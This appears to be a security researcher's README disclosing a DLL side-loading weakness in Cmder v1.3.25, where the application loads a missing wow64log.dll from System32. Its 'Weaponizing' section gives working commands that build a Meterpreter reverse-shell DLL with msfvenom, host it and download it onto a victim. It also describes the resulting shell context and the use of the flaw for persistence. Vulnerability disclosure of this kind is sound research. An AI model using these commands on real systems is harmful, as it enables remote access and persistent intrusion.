# Cmder DLL Side-Loading v1.3.25 (Full and Mini Versions)
According to https://cmder.app/ it is:
````
Cmder is a software package created out of pure frustration over the absence of nice
console emulators on Windows. It is based on amazing software, and spiced up with
the Monokai color scheme and a custom prompt layout, looking sexy from the start.
````
- I couldnt agree more, it is a great application and I use it on all my Windows systems.
- This repo details an issue in the Cmder application (Full and Mini Versions) in which a DLL is seached for and not found allowing an attacker the ability to get code execution

## Application Link
- https://cmder.app/
- https://github.com/cmderdev/cmder

## Overview
- In Sysinternals ProcessMonitor we can set three basic filters seen below
````
Process Name is Cmder.exe
Path Ends With .dll
Result is NAME NOT FOUND
````
![image](https://github.com/user-attachments/assets/57aa37ee-1d6a-4ef8-b19f-6aeee77faf46)
- The cmder application (Full version and Mini Version) both search for a dll located under `C:\Windows\System32\wow64log.dll`, however it cannot be found and is not included with Windows.
![image](https://github.com/user-attachments/assets/cc8ae186-ba31-47c4-8f33-2e1b48d3761d)

## Weaponizing
- We can generate a simple msfvenom DLL and place it under `C:\Windows\System32`, naming it `wow64log.dll`
````
# Generate the malicious DLL
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.15.130 LPORT=4444 -f dll -o wow64log.dll
# Host the payload
python3 -m http.server
# Transfer the payload to the victim system
cd C:\Windows\System32
iwr http://kali.space:8000/wow64log.dll -o wow64log.dll
````
![image](https://github.com/user-attachments/assets/ef851afc-fae9-43a6-bc10-1c52aa2e3a4a)
- Upon opening the application we will recieve a call back.
- From testing your Meterpreter shell will drop you into `C:\Windows` and your pid will be associated to `rundll32.exe`. Your PPID will no longer be running on the system.
## Privilege Escalation
- From testing if the Cmder application is run without Administrator permissions you will recieve a shell in the context of your user account.
- If the Cmder application is run WITH Administrator permissions you will recieve a shell in the context of the Admin privileged account.
![image](https://github.com/user-attachments/assets/df922eee-615b-40a2-858f-1e9a1eaed4fd)
![image](https://github.com/user-attachments/assets/a1d8e088-1b7c-4613-a1d3-9695238a939a)

## Notes
- It should be noted that an attacker would require Administrator permissions in order to take advantage of this vulnerability. This is due to the missing DLL being located under `System32`. While this technique does not allow an attacker to priviledge escalate it does provide a potential persistance mechanism. This DLL Side Loading issue allows an attacker to gain code execution anytime the application Cmder is opened.
